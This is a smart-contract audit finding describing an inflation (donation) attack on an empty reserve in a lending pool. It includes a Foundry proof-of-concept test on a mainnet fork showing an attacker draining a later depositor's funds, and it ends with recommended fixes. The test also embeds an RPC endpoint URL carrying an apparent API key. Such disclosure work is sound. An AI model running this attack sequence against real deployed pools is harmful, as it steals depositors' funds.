# `LendingPool.sol` is susceptible to inflation attack on empty reserve with early deposit

## Summary

- An attacker can deploy a classic inflation attack on an empty lending pool reserve. They first deposit a minimal amount to mint only a few shares, then transfer a large amount of underlying tokens directly into the pool, causing the exchange rate to spike. Subsequent deposits receive negligible shares and lose almost their entire deposit.

Medium (High impact, Low likelihood)

## Finding Description

The deposit logic follows a simple formula: shares = amount Ã— totalSupply / totalAssets, and exchange rate = totalAssets / totalSupply. However, the contract does not prevent direct transfers of underlying tokens into the eToken contract and allows zero or minimal deposits. An attacker can:

1. Deposit a tiny amount to mint a small number of eTokens.
2. Donate a large amount of underlying tokens to the eToken contract directly, increasing totalAssets without minting new shares.
3. The exchange rate skyrockets, so when a new user deposits, they receive almost zero shares for their full deposit, effectively donating their funds to the pool.
4. The attacker redeems their initial eTokens at the inflated rate and withdraws nearly all donated tokens, profiting at the expense of new depositors.

## Impact Explanation

New depositors lose almost their entire deposit, which is effectively stolen by the attacker. This leads to a full loss of user funds and severe trust damage.

## Likelihood Explanation

- Low: This is well known exploit and unlikely to happen during deployment. There is no future reserve being planned by project so it is not a huge concern post-deployment.
- Attacker must monitor the `InitReserve` event and act immediately after a new reserve is created on an empty pool. Once any honest liquidity is added, the exchange rate can no longer be manipulated.

## Proof of Concept

1. Attacker deposits a minimal amount of LendingPool Underlying Token (e.g., 1 token) to receive eTokens.
2. Attacker transfers a large amount (e.g., 999 tokens) underlying token directly to the eToken contract.
3. New user deposits a full balance (e.g., 500 tokens) but receives almost zero eTokens.
4. Attacker redeems initial eTokens and withdraws the donated tokens, draining new user funds.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "contracts/AddressRegistry.sol";
import "contracts/mock/MockWETH9.sol";
import "contracts/shadow/ShadowRangeVault.sol";
import "contracts/shadow/ShadowRangePositionImpl.sol";
import "contracts/shadow/ShadowPositionValueCalculator.sol";
import "contracts/VaultRegistry.sol"; //vault factory

import "contracts/lendingpool/LendingPool.sol";
import {PrimaryPriceOracle} from "contracts/PrimaryPriceOracle.sol";
//IShadowSwapRouter == uniswapRouterV3

contract DebugTest is Test {
    MockWETH9 public wS = MockWETH9(payable(0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38));
    ERC20 public wETH = ERC20(0x50c42dEAcD8Fc9773493ED674b675bE577f2634b); //MintedERC20 have burn function
    ERC20 public USDC = ERC20(0x29219dd400f2Bf60E5a23d13Be72B486D4038894); //e6
    ERC20 public USDT = ERC20(0x6047828dc181963ba44974801FF68e538dA5eaF9);

    AddressRegistry public addressRegistry;
    VaultRegistry public vaultRegistry;
    LendingPool public lendingPool;
    PrimaryPriceOracle public primaryPriceOracle;
    //IShadowSwapRouter public shadowSwapRouter;
    ShadowPositionValueCalculator public shadowPositionValueCalculator;

    ShadowRangeVault public vault1; // wS-USDC.e-50
    ShadowRangeVault public vault2; // wS-WETH-50
    ShadowRangeVault public vault3; // USDC.e-USDT-1

    address liquidator = makeAddr("liquidator");

    address treasuryAddress = 0x57C41F44aA5b0793a3fE0195F6c879892494109F;
    address positionManagerV3 = 0x12E66C8F215DdD5d48d150c8f46aD0c6fB0F4406;
    address swapRouter = 0x5543c6176FEb9B4b179078205d7C29EEa2e2d695;
    address swapxPositionManager = 0xd82Fe82244ad01AaD671576202F9b46b76fAdFE2;
    address swapXswapRouter = 0x037c162092881A249DC347D40Eb84438e3457c02;

    function setUp() public {
        vm.createSelectFork(
            "https://rpc.ankr.com/sonic_mainnet/95e6b7b3769824dfa420ef460b5fd940bff206ca48caea572c3a9198f245bbb5",
            21529000
        ); // Sonic/Phantom Mainnet Fork Block 21529000

        address admin = address(this);

        addressRegistry = new AddressRegistry(address(wS));
        addressRegistry.setAddress(1, address(wS)); // Set WETH9 address in AddressRegistry

        vaultRegistry = new VaultRegistry(address(addressRegistry));
        addressRegistry.setAddress(10, address(vaultRegistry)); // Set VaultRegistry address in AddressRegistry
        lendingPool = new LendingPool();
        lendingPool.initialize(address(addressRegistry), address(wS));
        addressRegistry.setAddress(9, address(lendingPool)); // Set LendingPool address in AddressRegistry

        primaryPriceOracle = new PrimaryPriceOracle();
        address[] memory initialTokens = new address[](4);
        bytes32[] memory priceIds = new bytes32[](4);
        initialTokens[0] = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38; // wS
        initialTokens[1] = 0x50c42dEAcD8Fc9773493ED674b675bE577f2634b; // wETH
        initialTokens[2] = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894; // USDC.e
        initialTokens[3] = 0x6047828dc181963ba44974801FF68e538dA5eaF9; // USDT
        priceIds[0] = 0xf490b178d0c85683b7a0f2388b40af2e6f7c90cbe0f96b31f315f08d0e5a2d6d; // wS price id
        priceIds[1] = 0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace; // wETH price id
        priceIds[2] = 0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a; // USDC.e price id
        priceIds[3] = 0x2b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b; // USDT price id

        primaryPriceOracle.initialize(
            0x2880aB155794e7179c9eE2e38200202908C17B43, // Pyth address on Phantom
            admin, // OracleManager address
            initialTokens, // Initial tokens (empty for now)
            priceIds // Initial price ids (empty for now)
        );
        addressRegistry.setAddress(100, address(primaryPriceOracle)); // Set PrimaryPriceOracle address in AddressRegistry

        addressRegistry.setAddress(11, address(treasuryAddress)); // Set Treasury address in AddressRegistry
        addressRegistry.setAddress(12, address(treasuryAddress)); // Set Performance Fee Recipient address in AddressRegistry
        addressRegistry.setAddress(13, address(treasuryAddress)); // Set Liquidation Fee Recipient address in AddressRegistry
        addressRegistry.setAddress(300, address(swapRouter)); // Set ShadowSwapRouter address in AddressRegistry
        addressRegistry.setAddress(301, address(positionManagerV3)); // Set ShadowNonFungiblePositionManager address in AddressRegistry
        shadowPositionValueCalculator = new ShadowPositionValueCalculator();
        addressRegistry.setAddress(302, address(shadowPositionValueCalculator)); // Set ShadowPositionValueCalculator address in AddressRegistry

        //Lending Pool config
        lendingPool.initReserve(0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38); // wS
        lendingPool.initReserve(0x50c42dEAcD8Fc9773493ED674b675bE577f2634b); // wETH
        lendingPool.initReserve(0x29219dd400f2Bf60E5a23d13Be72B486D4038894); // USDC.e
        lendingPool.initReserve(0x6047828dc181963ba44974801FF68e538dA5eaF9); // USDT
        //create vaults
        vault1 = new ShadowRangeVault();
        vault1.initialize(
            address(addressRegistry),
            address(vaultRegistry),
            0x324963c267C354c7660Ce8CA3F5f167E05649970, //Pool: wS/USDC.e , from Gauge 0xe879d0e44e6873cf4ab71686055a4f6817685f02
            address(new ShadowRangePositionImpl())
        );
        vault1.setLiquidationFeeParams(500, 5000);
        vault1.setOpenLiquidationEnabled(true);
        vault1.setPerformanceFee(1500);
        vault1.setMinPositionSize(1 * 10 ** 8); // 1 USDC.e
        vault1.setShadowGauge(0xe879d0E44e6873cf4ab71686055a4f6817685f02);
        vaultRegistry.newVault(address(vault1)); //vaultId = 1
        lendingPool.setCreditsOfVault(1, 1, type(uint256).max); // wS
        lendingPool.setCreditsOfVault(1, 3, type(uint256).max); // USDC.e

        skip(30); // skip 30 seconds to avoid block.timestamp = 0
    }

    function testDebugInflationAttack() public {
        console.log("Debugging test started");
        address exploiter = makeAddr("Exploiter");
        vm.startPrank(exploiter);
        deal(address(wS), exploiter, 1000 ether);
        deal(address(USDC), exploiter, 2000e6);
        wS.approve(address(lendingPool), type(uint256).max);
        USDC.approve(address(lendingPool), type(uint256).max);

        // oracle should return 4 token prices. Pyth always return e8 price in USD$
        console.log("wS price: %e", primaryPriceOracle.getTokenPrice(address(wS)));
        console.log("wETH price: %e", primaryPriceOracle.getTokenPrice(address(wETH)));
        console.log("USDC.e price: %e", primaryPriceOracle.getTokenPrice(address(USDC)));
        console.log("USDT price: %e", primaryPriceOracle.getTokenPrice(address(USDT)));

        debugReserve(1);
        //deposit wS and USDC.e to vault1
        uint256 tokenOut = lendingPool.deposit(1, 1, exploiter, 0); // wS
        console.log("-deposit and get eToken: %e", tokenOut);
        debugReserve(1);
        //inflate wS by increasing availableLiquidity
        wS.transfer(lendingPool.getETokenAddress(1), 999e18);
        debugReserve(1);
        console.log("-exchange rate inflated to really high value");

        address user = makeAddr("User");
        vm.startPrank(user);
        deal(address(wS), user, 500 ether);
        wS.approve(address(lendingPool), type(uint256).max);
        uint256 tokenOut2 = lendingPool.deposit(1, 500e18, user, 0);
        console.log("-second user deposit tokenOut: %e", tokenOut2);
        debugReserve(1);

        vm.startPrank(exploiter);
        ERC20(lendingPool.getETokenAddress(1)).approve(address(lendingPool), type(uint256).max);
        uint256 redeemedTokens = lendingPool.redeem(1, type(uint256).max, exploiter, false);
        console.log("-exploiter redeemed tokens: %e", redeemedTokens);// 1,300e18 token
        debugReserve(1);
    }

    function debugReserve(uint256 reserveId) public view {
        console.log("----Reserve Status [%d]----", reserveId);
        // console.log("%s Underlying Token Address", lendingPool.getUnderlyingTokenAddress(reserveId));
        // console.log("%s eToken Address", lendingPool.getETokenAddress(reserveId));
        // console.log("%s Staking Address", lendingPool.getStakingAddress(reserveId));
        console.log("%e Total Liquidity", lendingPool.totalLiquidityOfReserve(reserveId));
        console.log("%e Total Borrows", lendingPool.totalBorrowsOfReserve(reserveId));
        console.log("%e Exchange Rate", lendingPool.exchangeRateOfReserve(reserveId));
        console.log("%e Utilization Rate", lendingPool.utilizationRateOfReserve(reserveId));
        console.log("%e Borrowing Rate", lendingPool.borrowingRateOfReserve(reserveId));
        // Additional reserve properties (like fee rate, booleans, update timestamp, borrowing index)
        // would need new getter functions in LendingPool.
        console.log("%e BorrowingIndex", lendingPool.latestBorrowingIndex(reserveId));
    }
}

```

## Recommendation

- Enforce a meaningful minimum deposit size to ensure initial liquidity cannot be set at near zero.
- Prevent zero or near-zero share minting by requiring that each deposit mints at least one share (e.g., revert when `eTokenAmount == 0`).
